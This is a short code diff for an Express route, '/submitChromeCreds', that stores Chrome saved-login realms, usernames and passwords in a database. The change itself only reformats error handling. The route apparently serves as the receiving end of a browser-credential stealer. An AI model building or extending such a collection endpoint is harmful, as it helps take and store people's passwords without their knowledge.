@@ -40,7 +40,9 @@ router.post('/submitChromeCreds', function(req, res, next) {
       db.query(query,
           [ranStamp, el.signon_realm, el.username_value, el.password_value],
           function(err, status) {
-            if (err) { return next(err); }
+            if (err) { 
+              return next(err); 
+            }
           }
       );
     });
